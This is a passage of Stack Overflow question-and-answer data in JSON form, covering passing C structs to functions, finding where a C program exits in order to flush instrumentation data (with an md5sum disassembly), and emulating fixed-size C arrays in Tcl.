href=\"https://en.wiktionary.org/wiki/YMMV\" rel=\"nofollow noreferrer\">YMMV</a>"}], "tags": [], "owner": {"reputation": 219634, "user_id": 2877241, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/63d17ecdadc8917254be4fb70e86246b?s=128&d=identicon&r=PG&f=1", "display_name": "Vlad from Moscow", "link": "https://stackoverflow.com/users/2877241/vlad-from-moscow"}, "is_accepted": false, "score": 3, "last_activity_date": 1437583675, "last_edit_date": 1437583675, "creation_date": 1437582683, "answer_id": 31568923, "question_id": 31568778, "link": "https://stackoverflow.com/questions/31568778/changing-a-struct-on-the-stack-inside-function/31568923#31568923", "title": "Changing a struct on the stack inside function", "body": "<p>Define finction <code>Person_create</code> the following way</p>\n\n<pre><code>void Person_create(struct Person *p, char *name, int age, int height, int weight)\n{\n    p-&gt;name = name;\n    p-&gt;age = age;\n    p-&gt;height = height;\n    p-&gt;weight = weight;\n}\n</code></pre>\n\n<p>and call it like</p>\n\n<pre><code>Person_create( &amp;joe, \"Joe Alex\", 32, 64, 140 );\n</code></pre>\n\n<p>A more sophisticated approach is the following</p>\n\n<pre><code>#include &lt;string.h&gt;\n#include &lt;stdlib.h&gt;\n\n//...\n\nvoid Person_create(struct Person *p, const char *name, int age, int height, int weight)\n{\n    size_t n = strlen( name );\n    p-&gt;name = malloc( ( n + 1 ) * sizeof( char ) );\n    strcpy( p-&gt;name, name );\n    p-&gt;age = age;\n    p-&gt;height = height;\n    p-&gt;weight = weight;\n}\n</code></pre>\n\n<p>However in this case you should remember to free the allocated memory when the object of the structure leaves its scope.</p>\n"}, {"tags": [], "owner": {"reputation": 21, "user_id": 5973322, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/P36qc.jpg?s=128&g=1", "display_name": "kemchenj", "link": "https://stackoverflow.com/users/5973322/kemchenj"}, "is_accepted": false, "score": 0, "last_activity_date": 1456761515, "last_edit_date": 1456761515, "creation_date": 1456303662, "answer_id": 35597287, "question_id": 31568778, "link": "https://stackoverflow.com/questions/31568778/changing-a-struct-on-the-stack-inside-function/35597287#35597287", "title": "Changing a struct on the stack inside function", "body": "<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\ntypedef struct {\n        char *name;\n        int age;\n        int height;\n        int weight;\n}Person;\n\nvoid Person_print(Person who)\n{\n        printf(\"Name: %s\\n\", who.name);\n        printf(\"\\tAge: %d\\n\", who.age);\n        printf(\"\\tHeight: %d\\n\", who.height);\n        printf(\"\\tWeight: %d\\n\", who.weight);\n}\n\nint main(int argc, char *argv[])\n{\n        Person joe= {\"Joe Alex\", 32, 64, 140};\n        Person frank={\"Joe Alex\", 32, 64, 140};\n\n        printf(\"Joe is at memory location: %p\\n\", &amp;joe);\n        Person_print(joe);\n\n        printf(\"Frank is at memory location: %p\\n\", &amp;frank);\n        Person_print(frank);\n\n        joe.age += 20;\n        joe.height -= 2;\n        joe.weight += 40;\n        Person_print(joe);\n\n        frank.age += 20;\n        frank.weight += 20;\n        Person_print(frank);\n\n        return 0;\n}\n</code></pre>\n\n<p>Typedef the struct called 'Person', then you don't have to use 'Person create'.</p>\n"}], "owner": {"reputation": 145, "user_id": 4013658, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7732ca2ed411624b55cc05097790bfe7?s=128&d=identicon&r=PG&f=1", "display_name": "Amir", "link": "https://stackoverflow.com/users/4013658/amir"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 237, "favorite_count": 0, "accepted_answer_id": 31568839, "answer_count": 3, "score": 1, "last_activity_date": 1545847738, "creation_date": 1437582244, "last_edit_date": 1545847738, "question_id": 31568778, "link": "https://stackoverflow.com/questions/31568778/changing-a-struct-on-the-stack-inside-function", "title": "Changing a struct on the stack inside function", "body": "<p>I am working through the <em>Learn C the Hard Way</em> and I am currently stuck on the <a href=\"http://c.learncodethehardway.org/book/ex16.html\" rel=\"nofollow noreferrer\">extra credit exercise number 16</a>.</p>\n\n<p>I am currently trying to adapt their code and making the struct on the stack instead of the heap but my code is giving me segmentation fault and I am unsure why or how to proceed. Any advice is greatly appreciated.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nstruct Person {\n    char *name;\n    int age;\n    int height;\n    int weight;\n};\n\nvoid Person_create(struct Person p,char *name,int age,int height,int weight)\n{\n    p.name = name;\n    p.age = age;\n    p.height = height;\n    p.weight = weight;\n}\n\nvoid Person_print(struct Person who)\n{\n    printf(\"Name: %s\\n\", who.name);\n    printf(\"\\tAge: %d\\n\", who.age);\n    printf(\"\\tHeight: %d\\n\", who.height);\n    printf(\"\\tWeight: %d\\n\", who.weight);\n}\n\nint main(int argc, char *argv[])\n{\n    // make two people structures\n    struct Person joe;\n    struct Person frank;\n    Person_create(\n            joe,\"Joe Alex\",32,64,140);\n\n    Person_create(\n            frank,\"Frank Blank\",20,72,180);\n\n    // print them out\n    Person_print(joe);\n    Person_print(frank);\n\n    // make everyone age 20 years and print them again\n    joe.age += 20;\n    joe.height -= 2;\n    joe.weight += 40;\n    Person_print(joe);\n\n    frank.age += 20;\n    frank.weight += 20;\n    Person_print(frank);\n\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "linux", "assembly", "binary"], "comments": [{"owner": {"reputation": 208003, "user_id": 841108, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/Fm52y.png?s=128&g=1", "display_name": "Basile Starynkevitch", "link": "https://stackoverflow.com/users/841108/basile-starynkevitch"}, "edited": false, "score": 0, "creation_date": 1437582460, "post_id": 31568477, "comment_id": 51092842, "body": "Is your instrumentation some free software? I would be glad to look inside your code...."}, {"owner": {"reputation": 23069, "user_id": 156811, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/380335e95e6be9740e56b64d667279b3?s=128&d=identicon&r=PG", "display_name": "Havenard", "link": "https://stackoverflow.com/users/156811/havenard"}, "edited": false, "score": 1, "creation_date": 1437583074, "post_id": 31568477, "comment_id": 51093201, "body": "I don&#39;t think thats always well defined. Once a optimizer has done its job, there might not even be defined boundaries between functions, or even between <code>main()</code> and the stuff from libc that is called before it (the program&#39;s entrypoint). A possible clue would be to keep track of how stack is being used, but again, I don&#39;t think its necessarily true that the stack will be fully reversed when the program is exiting."}], "answers": [{"tags": [], "owner": {"reputation": 208003, "user_id": 841108, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/Fm52y.png?s=128&g=1", "display_name": "Basile Starynkevitch", "link": "https://stackoverflow.com/users/841108/basile-starynkevitch"}, "is_accepted": false, "score": 4, "last_activity_date": 1437592398, "last_edit_date": 1437592398, "creation_date": 1437581943, "answer_id": 31568680, "question_id": 31568477, "link": "https://stackoverflow.com/questions/31568477/how-to-find-the-exit-of-a-c-program/31568680#31568680", "title": "How to find the &quot;exit&quot; of a C program", "body": "<p>I believe you cannot do that in the general case. First, if <code>main</code> is returning some code, it is an exit code (if <code>main</code> has no explicit <code>return</code> the recent C standards require that the compiler adds an <em>implicit</em> <code>return 0;</code>). Then a function could store the address of <code>exit</code> in some data (e.g. a global function, a field in a <code>struct</code>, ...), and some <em>other</em> function could <em>indrectly</em> call that thru a function pointer. Practically, a program can load some plugins using <code>dlopen</code> and use <code>dlsym</code> for <code>\"exit\"</code> name, or simply call <code>exit</code> inside the plugin, etc... AFAIU solving that problem (of finding actual <code>exit</code> calls, in the dynamic sense) in full generality can be proved equivalent to the <a href=\"https://en.wikipedia.org/wiki/Halting_problem\" rel=\"nofollow\">halting problem</a>. See also <a href=\"https://en.wikipedia.org/wiki/Rice%27s_theorem\" rel=\"nofollow\">Rice's theorem</a>.</p>\n\n<p>Without claiming an exhaustive approach, I would suggest something else (assuming you are interested in instrumenting programs coded in C or C++, etc... whose source code is available to you). You could customize the GCC compiler with <a href=\"http://gcc-melt.org/\" rel=\"nofollow\">MELT</a> to change the basic blocks processed inside GCC to call some of your instrumentation functions. It is not trivial, but it is doable... Of course you'll need to recompile some C code with such a customized GCC to instrument it.</p>\n\n<p><sup>(Disclaimer, I am the main author of <a href=\"http://gcc-melt.org/\" rel=\"nofollow\">MELT</a>; feel free to contact me for more...)</sup></p>\n\n<p>BTW, do you know about <a href=\"http://man7.org/linux/man-pages/man3/atexit.3.html\" rel=\"nofollow\">atexit(3)</a>? It could be helpful for your flushing issue... And you might also use <code>LD_PRELOAD</code> tricks (read about <a href=\"https://en.wikipedia.org/wiki/Dynamic_linker\" rel=\"nofollow\">dynamic linkers</a>, see <a href=\"http://man7.org/linux/man-pages/man8/ld-linux.8.html\" rel=\"nofollow\">ld-linux(8)</a>).</p>\n"}, {"comments": [{"owner": {"reputation": 14659, "user_id": 2705055, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/b1d5dfaf239229501a184c8858fbc954?s=128&d=identicon&r=PG&f=1", "display_name": "Martin Rosenau", "link": "https://stackoverflow.com/users/2705055/martin-rosenau"}, "edited": false, "score": 0, "creation_date": 1437591495, "post_id": 31569185, "comment_id": 51098312, "body": "It depends if the program being debugged is written using a regular development tool chain or not: Most programs written in assembler (for learning purposes) call the &quot;exit&quot; system call directly which means that &quot;on_exit&quot; or &quot;atexit&quot; functions are not handled. When a program is interrupted by &quot;kill&quot; this is also the case."}, {"owner": {"reputation": 53754, "user_id": 198536, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/9edaf4c1c1b89b5d39c40528d0017509?s=128&d=identicon&r=PG", "display_name": "wallyk", "link": "https://stackoverflow.com/users/198536/wallyk"}, "reply_to_user": {"reputation": 14659, "user_id": 2705055, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/b1d5dfaf239229501a184c8858fbc954?s=128&d=identicon&r=PG&f=1", "display_name": "Martin Rosenau", "link": "https://stackoverflow.com/users/2705055/martin-rosenau"}, "edited": false, "score": 0, "creation_date": 1437593493, "post_id": 31569185, "comment_id": 51099541, "body": "@MartinRosenau:  How many non-student assembly programs might there be on Linux?"}], "tags": [], "owner": {"reputation": 53754, "user_id": 198536, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/9edaf4c1c1b89b5d39c40528d0017509?s=128&d=identicon&r=PG", "display_name": "wallyk", "link": "https://stackoverflow.com/users/198536/wallyk"}, "is_accepted": false, "score": 2, "last_activity_date": 1437599848, "last_edit_date": 1437599848, "creation_date": 1437583454, "answer_id": 31569185, "question_id": 31568477, "link": "https://stackoverflow.com/questions/31568477/how-to-find-the-exit-of-a-c-program/31569185#31569185", "title": "How to find the &quot;exit&quot; of a C program", "body": "<p><a href=\"http://linux.die.net/man/3/atexit\" rel=\"nofollow\"><code>atexit()</code></a> will properly handle 95+% of programs.  You can either modify its chain of registered handlers, or instrument it as you are other blocks.  However, some programs may terminate by use of <a href=\"http://linux.die.net/man/3/_exit\" rel=\"nofollow\"><code>_exit()</code></a> which does not invoke <em>atexit</em> handlers.  Probably instrumenting <em>_exit</em> to invoke data flushing and installing an atexit (or <a href=\"http://linux.die.net/man/3/on_exit\" rel=\"nofollow\"><code>on_exit()</code></a> on BSD-like programs) handler should cover nearly 100% of programs.</p>\n\n<hr>\n\n<p>Addendum:  Note that the <em>Linux Base Specification</em> <a href=\"http://refspecs.linuxbase.org/LSB_3.1.1/LSB-Core-generic/LSB-Core-generic/baselib---libc-start-main-.html\" rel=\"nofollow\">says</a> that the C library startup shall:</p>\n\n<blockquote>\n  <p>call the initializer function (*init)().<br>\n  call main() with appropriate arguments.<br>\n  call exit() with the return value from main().</p>\n</blockquote>\n"}, {"tags": [], "owner": {"reputation": 14659, "user_id": 2705055, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/b1d5dfaf239229501a184c8858fbc954?s=128&d=identicon&r=PG&f=1", "display_name": "Martin Rosenau", "link": "https://stackoverflow.com/users/2705055/martin-rosenau"}, "is_accepted": false, "score": 0, "last_activity_date": 1437592014, "creation_date": 1437592014, "answer_id": 31571905, "question_id": 31568477, "link": "https://stackoverflow.com/questions/31568477/how-to-find-the-exit-of-a-c-program/31571905#31571905", "title": "How to find the &quot;exit&quot; of a C program", "body": "<p>A method that should be working everytime would be to create a shared memory section for storing your data there.</p>\n\n<p>You also create a child process which is waiting for the process being debugged to finish.</p>\n\n<p>As soon as the process being debugged has finished the child process will finalize the write operations using the data that is in the shared memory.</p>\n\n<p>This should work on all forms of exit, process interruptions (e.g. Ctrl+C, closing the terminal window, ...) or even if the process has been killed using \"kill\".</p>\n"}, {"comments": [{"owner": {"reputation": 3761, "user_id": 3982001, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rX1ss.png?s=128&g=1", "display_name": "Fabio says Reinstate Monica", "link": "https://stackoverflow.com/users/3982001/fabio-says-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1467846329, "post_id": 38234822, "comment_id": 63891931, "body": "This is wrong (you are declaring a variable, <code>keepGoing</code>, between <code>main()</code> and the brace!) and it requires user interaction (<code>cin</code>) to work. I don&#39;t think you have understood the question."}], "tags": [], "owner": {"reputation": 1, "user_id": 6558303, "user_type": "unregistered", "profile_image": "https://www.gravatar.com/avatar/0f5395cc6ac4b0b2ce33ff92f1a82d3b?s=128&d=identicon&r=PG", "display_name": "MexicanSweat", "link": "https://stackoverflow.com/users/6558303/mexicansweat"}, "is_accepted": false, "score": -1, "last_activity_date": 1467852063, "last_edit_date": 1467852063, "creation_date": 1467844063, "answer_id": 38234822, "question_id": 31568477, "link": "https://stackoverflow.com/questions/31568477/how-to-find-the-exit-of-a-c-program/38234822#38234822", "title": "How to find the &quot;exit&quot; of a C program", "body": "<p>You could try this:</p>\n\n<pre><code>int main() \nbool keepGoing = true;\n{\n    while(keepGoing) {\n        string x;\n        cin &gt;&gt; x;\n        if(x == \"stop\") {\n            keepGoing = false;\n        }\n    }\n}\n</code></pre>\n\n<p>even though it is primitive... I probably butchered the coding but it's just a concept.</p>\n"}, {"comments": [{"owner": {"reputation": 41564, "user_id": 3857942, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hXLnN.jpg?s=128&g=1", "display_name": "Michael Petch", "link": "https://stackoverflow.com/users/3857942/michael-petch"}, "edited": false, "score": 0, "creation_date": 1467853962, "post_id": 38235092, "comment_id": 63893899, "body": "Technically <code>__libc_start_main()</code> should never return. The <code>hlt</code> should never be reached. <code>__libc_start_main</code> will at one point invoke one of the exit functions which will do a <code>sys_exit</code> system call to terminate the user program."}, {"owner": {"reputation": 439, "user_id": 2866527, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b5c4440345ec519dd606fc2375c5f426?s=128&d=identicon&r=PG&f=1", "display_name": "Edward", "link": "https://stackoverflow.com/users/2866527/edward"}, "edited": false, "score": 0, "creation_date": 1551254738, "post_id": 38235092, "comment_id": 96568813, "body": "Interestingly, <code>hlt</code> is a privileged instruction and will actually raise an exception. See the discussion in the comments <a href=\"https://stackoverflow.com/a/29502615/2866527\">here</a> and <a href=\"https://eli.thegreenplace.net/2012/08/13/how-statically-linked-programs-run-on-linux\" rel=\"nofollow noreferrer\">here</a>. LSB Specification for <code>__libc_start_main()</code> is <a href=\"http://refspecs.linuxfoundation.org/LSB_5.0.0/LSB-Core-generic/LSB-Core-generic/baselib---libc-start-main-.html\" rel=\"nofollow noreferrer\">here</a>."}, {"owner": {"reputation": 48201, "user_id": 1250772, "user_type": "registered", "accept_rate": 45, "profile_image": "https://www.gravatar.com/avatar/633e1f643d2c9b043231b4a32b078907?s=128&d=identicon&r=PG", "display_name": "Kaz", "link": "https://stackoverflow.com/users/1250772/kaz"}, "reply_to_user": {"reputation": 439, "user_id": 2866527, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b5c4440345ec519dd606fc2375c5f426?s=128&d=identicon&r=PG&f=1", "display_name": "Edward", "link": "https://stackoverflow.com/users/2866527/edward"}, "edited": false, "score": 0, "creation_date": 1551280533, "post_id": 38235092, "comment_id": 96584245, "body": "@Edward That sort of makes sense; under virtualization, it&#39;s very useful for the VM monitor to know when the guest OS is idle."}], "tags": [], "owner": {"reputation": 48201, "user_id": 1250772, "user_type": "registered", "accept_rate": 45, "profile_image": "https://www.gravatar.com/avatar/633e1f643d2c9b043231b4a32b078907?s=128&d=identicon&r=PG", "display_name": "Kaz", "link": "https://stackoverflow.com/users/1250772/kaz"}, "is_accepted": false, "score": 0, "last_activity_date": 1467845616, "creation_date": 1467845616, "answer_id": 38235092, "question_id": 31568477, "link": "https://stackoverflow.com/questions/31568477/how-to-find-the-exit-of-a-c-program/38235092#38235092", "title": "How to find the &quot;exit&quot; of a C program", "body": "<blockquote>\n  <p>But according to some debugging experience, the target C program, say, a md5sum binary, does not call exit when it finishes the execution.</p>\n</blockquote>\n\n<p>Let's take a look at a <code>md5sum</code> binary on an <code>i686</code> GNU/Linux system:</p>\n\n<p>In the disassembly (<code>objdump -d /usr/bin/md5sum</code>) we have this:</p>\n\n<pre><code>Disassembly of section .text:\n\n08048f50 &lt;.text&gt;:\n 8048f50:       55                      push   %ebp\n 8048f51:       89 e5                   mov    %esp,%ebp\n 8048f53:       57                      push   %edi\n 8048f54:       56                      push   %esi\n 8048f55:       53                      push   %ebx\n 8048f56:       83 e4 f0                and    $0xfffffff0,%esp\n 8048f59:       81 ec c0 00 00 00       sub    $0xc0,%esp\n 8048f5f:       8b 7d 0c                mov    0xc(%ebp),%edi\n\n[ ... ]\n\n 8049e8f:       68 b0 d6 04 08          push   $0x804d6b0\n 8049e94:       68 40 d6 04 08          push   $0x804d640\n 8049e99:       51                      push   %ecx\n 8049e9a:       56                      push   %esi\n 8049e9b:       68 50 8f 04 08          push   $0x8048f50\n 8049ea0:       e8 4b ef ff ff          call   8048df0 &lt;__libc_start_main@plt&gt;\n 8049ea5:       f4                      hlt    \n</code></pre>\n\n<p>This is all startup boilerplate code. The actual program's <code>main</code> call is invoked inside the call <a href=\"http://refspecs.linuxbase.org/LSB_3.1.0/LSB-Core-generic/LSB-Core-generic/baselib---libc-start-main-.html\" rel=\"nofollow\"><code>__libc_start_main</code></a>.  If the program returns from that, then, hey look, there is a <code>hlt</code> instruction. That's your target. Look for that <code>hlt</code> instruction and instrument that as the end of the program.</p>\n"}], "owner": {"reputation": 6631, "user_id": 1488533, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/e063fcfd88a6af736427025f7ac14649?s=128&d=identicon&r=PG&f=1", "display_name": "lllllllllllll", "link": "https://stackoverflow.com/users/1488533/lllllllllllll"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1479, "favorite_count": 0, "answer_count": 5, "score": 5, "last_activity_date": 1467852063, "creation_date": 1437581366, "last_edit_date": 1437599927, "question_id": 31568477, "link": "https://stackoverflow.com/questions/31568477/how-to-find-the-exit-of-a-c-program", "title": "How to find the &quot;exit&quot; of a C program", "body": "<p>The test is on <code>32-bit x86</code> Linux.</p>\n\n<p>So basically I am trying to log the information of <strong>executed basic blocks</strong> by insert instrumentation instructions in assembly code.</p>\n\n<p>My strategy is like this: Write the index of a executed basic block in a globl array, and flush the array from memory to the disk when the array is full (16M).</p>\n\n<p>Here is my problem. I need the flush the array to the disk when the execution of instrumented binary is over, even if it does not reach 16M boundary. However, I just don't know where to find the exit of a <code>assembly</code> program. </p>\n\n<p>I tried this:</p>\n\n<ol>\n<li><p><code>grep exit</code> from the target assembly program, and flush the memory right before the <code>call exit</code> instruction. But according to some debugging experience, the target C program, say, a <code>md5sum</code> binary, does not call <code>exit</code> when it finishes the execution.</p></li>\n<li><p>Flush the memory at the end of <code>main</code> function. However, in the assembly code, I just don't know where is the exact end of <code>main</code> function. I can do a conservative approach, say, looking for all the <code>ret</code> instruction, but it seems to me that not all the <code>main</code> function ends with a <code>ret</code> instruction.</p></li>\n</ol>\n\n<p>So here is my question, how to identify the exact execution end of a <code>assembly code</code> , and insert some instrumentation instructions there? Hooking some library code is fine to me. I understand with different input, binary could exit at different position, so I guess I need some conservative estimation. Am I clear? thanks!</p>\n"}, {"tags": ["c", "arrays", "data-structures", "tcl"], "comments": [{"owner": {"reputation": 119001, "user_id": 301832, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/965220a70d38e6a29466f44cdb4f804e?s=128&d=identicon&r=PG", "display_name": "Donal Fellows", "link": "https://stackoverflow.com/users/301832/donal-fellows"}, "edited": false, "score": 0, "creation_date": 1437599669, "post_id": 31568245, "comment_id": 51103095, "body": "The thing that matches a C array is a Tcl list. (They&#39;re implemented with C arrays behind the scenes.) You can return them as they&#39;re ordinary copy-on-write values, and they inherently know their order. Setting a value at an index \u2014 your second operation \u2014 is done with <code>lset</code> (or <code>lreplace</code> if used right). True <i>insertion</i> makes the list longer and usually uses <code>linsert</code>. It&#39;s also not what you&#39;re apparently asking for."}], "answers": [{"comments": [{"owner": {"reputation": 647, "user_id": 1486262, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/6f966ed16d86f9c752cf894ad9f8e254?s=128&d=identicon&r=PG", "display_name": "watersnake", "link": "https://stackoverflow.com/users/1486262/watersnake"}, "edited": false, "score": 0, "creation_date": 1437581866, "post_id": 31568582, "comment_id": 51092459, "body": "I don&#39;t understand what you mean by &quot;a new ordering&quot;. Basically, I want a box with 8 compartments. Compartments are labeled 0 through 7. I can put something in compartment 7, even if compartments 0 thru 6 are empty. If I iterate through what&#39;s in my box, it will go &quot;Compartment0, Compartment1, ... Compartment7&quot; every time. Hopefully this makes sense."}], "tags": [], "owner": {"reputation": 5004, "user_id": 1930666, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/BiEzi.jpg?s=128&g=1", "display_name": "Brad Lanam", "link": "https://stackoverflow.com/users/1930666/brad-lanam"}, "is_accepted": false, "score": 1, "last_activity_date": 1437582191, "last_edit_date": 1437582191, "creation_date": 1437581633, "answer_id": 31568582, "question_id": 31568245, "link": "https://stackoverflow.com/questions/31568245/c-like-array-in-tcl/31568582#31568582", "title": "C-Like Array in TCL", "body": "<p>Either the tcl <a href=\"http://www.tcl.tk/man/tcl8.6/TclCmd/array.htm\" rel=\"nofollow\">array</a> (<a href=\"http://www.tcl.tk/man/tcl8.5/tutorial/Tcl22.html\" rel=\"nofollow\">some examples</a>) or the tcl <a href=\"http://www.tcl.tk/man/tcl8.6/TclCmd/dict.htm\" rel=\"nofollow\" title=\"dict\">dict</a> command will suit your needs.</p>\n"}, {"comments": [{"owner": {"reputation": 647, "user_id": 1486262, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/6f966ed16d86f9c752cf894ad9f8e254?s=128&d=identicon&r=PG", "display_name": "watersnake", "link": "https://stackoverflow.com/users/1486262/watersnake"}, "edited": false, "score": 0, "creation_date": 1437586564, "post_id": 31570116, "comment_id": 51095264, "body": "If it&#39;s preallocated, it will allow me to insert objects where ever I want, correct?"}, {"owner": {"reputation": 12685, "user_id": 488796, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3bec8145ec10828cf4988b6b2005bafa?s=128&d=identicon&r=PG&f=1", "display_name": "Peter Lewerin", "link": "https://stackoverflow.com/users/488796/peter-lewerin"}, "reply_to_user": {"reputation": 647, "user_id": 1486262, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/6f966ed16d86f9c752cf894ad9f8e254?s=128&d=identicon&r=PG", "display_name": "watersnake", "link": "https://stackoverflow.com/users/1486262/watersnake"}, "edited": false, "score": 1, "creation_date": 1437587913, "post_id": 31570116, "comment_id": 51096050, "body": "@Sawyer: yes, it will."}, {"owner": {"reputation": 647, "user_id": 1486262, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/6f966ed16d86f9c752cf894ad9f8e254?s=128&d=identicon&r=PG", "display_name": "watersnake", "link": "https://stackoverflow.com/users/1486262/watersnake"}, "edited": false, "score": 0, "creation_date": 1437662675, "post_id": 31570116, "comment_id": 51133258, "body": "This is exactly what I wanted. You even added examples after I already accepted your answer. I cannot thank you enough."}, {"owner": {"reputation": 12685, "user_id": 488796, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3bec8145ec10828cf4988b6b2005bafa?s=128&d=identicon&r=PG&f=1", "display_name": "Peter Lewerin", "link": "https://stackoverflow.com/users/488796/peter-lewerin"}, "reply_to_user": {"reputation": 647, "user_id": 1486262, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/6f966ed16d86f9c752cf894ad9f8e254?s=128&d=identicon&r=PG", "display_name": "watersnake", "link": "https://stackoverflow.com/users/1486262/watersnake"}, "edited": false, "score": 1, "creation_date": 1437670270, "post_id": 31570116, "comment_id": 51138901, "body": "@Sawyer: no problem. Good luck with the porting."}], "tags": [], "owner": {"reputation": 12685, "user_id": 488796, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3bec8145ec10828cf4988b6b2005bafa?s=128&d=identicon&r=PG&f=1", "display_name": "Peter Lewerin", "link": "https://stackoverflow.com/users/488796/peter-lewerin"}, "is_accepted": true, "score": 5, "last_activity_date": 1439234818, "last_edit_date": 1439234818, "creation_date": 1437586300, "answer_id": 31570116, "question_id": 31568245, "link": "https://stackoverflow.com/questions/31568245/c-like-array-in-tcl/31570116#31570116", "title": "C-Like Array in TCL", "body": "<p>The corresponding data structure would be <code>list</code>. It meets all your requirements. If you want it to have a fixed size, you \"pre-allocate\" it like this:</p>\n\n<pre><code>set data [lrepeat 8 {}]\n</code></pre>\n\n<p>which creates eight empty compartments.</p>\n\n<p>It is ordered, you can access every element by index (0-based), and you can pass its value into procedures/functions and also return it. You can traverse it with e.g. <code>foreach</code> and <code>for</code>, and there are a lot of list manipulating commands.</p>\n\n<p><hr>\nWhile <code>list</code> is the Tcl data container that corresponds most closely to a C array, one can use <code>array</code> or <code>dict</code> to simulate a fixed-size, direct-access, ordered container.</p>\n\n<pre><code># allocation\nset listdata [lrepeat 8 {}]\narray set arraydata {0 {} 1 {} 2 {} 3 {} 4 {} 5 {} 6 {} 7 {}}\nset dictdata [dict create 0 {} 1 {} 2 {} 3 {} 4 {} 5 {} 6 {} 7 {}]\n# or\nset dictdata {0 {} 1 {} 2 {} 3 {} 4 {} 5 {} 6 {} 7 {}}\n\n# access (write, then read)\nlset listdata 5 96\nlindex $listdata 5 ;# -&gt; 96\nset arraydata(5) 96\nset arraydata(5) ;# -&gt; 96\ndict set dictdata 5 96\ndict get $dictdata 5 ;# -&gt; 96\n\n# return from procedure\n# (not possible with arraydata, arrays are shared using either\n# scope manipulation or namespaces)\nreturn $listdata\nreturn $dictdata\n\n# traversal\nfor {set i 0} {$i &lt; 8} {incr i} {puts [lindex $listdata $i]}\n# or\nforeach elem $listdata {puts $elem}\nfor {set i 0} {$i &lt; 8} {incr i} {puts [lindex $arraydata($i)]}\ndict for {idx val} $dictdata {puts $val}\n</code></pre>\n\n<p>Documentation: <a href=\"http://www.tcl.tk/man/tcl/TclCmd/array.htm\" rel=\"nofollow\" title=\"Manipulate array variables\">array</a>, <a href=\"http://www.tcl.tk/man/tcl/TclCmd/dict.htm\" rel=\"nofollow\" title=\"Manipulate dictionaries\">dict</a>, <a href=\"http://www.tcl.tk/man/tcl/TclCmd/for.htm\" rel=\"nofollow\" title=\"&#39;For&#39; loop\">for</a>, <a href=\"http://www.tcl.tk/man/tcl/TclCmd/foreach.htm\" rel=\"nofollow\" title=\"Iterate over all elements in one or more lists\">foreach</a>, <a href=\"http://www.tcl.tk/man/tcl/TclCmd/incr.htm\" rel=\"nofollow\" title=\"Increment the value of a variable\">incr</a>, <a href=\"http://www.tcl.tk/man/tcl/TclCmd/lindex.htm\" rel=\"nofollow\" title=\"Retrieve an element from a list\">lindex</a>, <a href=\"http://www.tcl.tk/man/tcl/TclCmd/lrepeat.htm\" rel=\"nofollow\" title=\"Build a list by repeating elements\">lrepeat</a>, <a href=\"http://www.tcl.tk/man/tcl/TclCmd/lset.htm\" rel=\"nofollow\" title=\"Change an element in a list\">lset</a>, <a href=\"http://www.tcl.tk/man/tcl/TclCmd/puts.htm\" rel=\"nofollow\" title=\"Write to a channel\">puts</a>, <a href=\"http://www.tcl.tk/man/tcl/TclCmd/return.htm\" rel=\"nofollow\" title=\"Return from a procedure, or set return code of a script\">return</a>, <a href=\"http://www.tcl.tk/man/tcl/TclCmd/set.htm\" rel=\"nofollow\" title=\"Read and write variables\">set</a></p>\n"}], "owner": {"reputation": 647, "user_id": 1486262, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/6f966ed16d86f9c752cf894ad9f8e254?s=128&d=identicon&r=PG", "display_name": "watersnake", "link": "https://stackoverflow.com/users/1486262/watersnake"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 198, "favorite_count": 0, "accepted_answer_id": 31570116, "answer_count": 2, "score": 2, "last_activity_date": 1439234818, "creation_date": 1437580736, "last_edit_date": 1437582145, "question_id": 31568245, "link": "https://stackoverflow.com/questions/31568245/c-like-array-in-tcl", "title": "C-Like Array in TCL", "body": "<p>I'm porting a program from C to TCL, and I'm trying to implement a data structure similar to an Array in C. The two main things I need it to do are</p>\n\n<ul>\n<li>Be Ordered</li>\n<li>Allow insertion into any index</li>\n<li>Return the array from a procedure</li>\n</ul>\n\n<p>I will know the size of the array before run time, and the size should not change throughout the program (so it is static). Are there any data structures that fit this bill?</p>\n\n<p>I'm using TCL 8.6 if that matters</p>\n\n<p>EDIT: I also need to be able to return the data structure from a function. </p>\n"}, {"tags": ["c", "fuse"], "answers": 